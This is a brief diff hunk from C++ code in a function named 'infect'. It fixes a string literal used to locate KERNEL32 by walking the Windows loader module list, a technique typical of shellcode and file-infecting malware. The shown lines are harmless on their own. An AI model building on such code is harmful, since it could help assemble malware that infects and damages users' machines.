@@ -79,7 +79,7 @@ void infect(void)
          continue;
       }
 
-      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == *reinterpret_cast<std::uint64_t *>("K\x00E\x00R\x00N\x00"))
+      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == *reinterpret_cast<std::uint64_t *>("K\x00""E\x00""R\x00""N\x00"))
          break;
       
       list_entry = table_entry->InLoadOrderLinks.Flink;
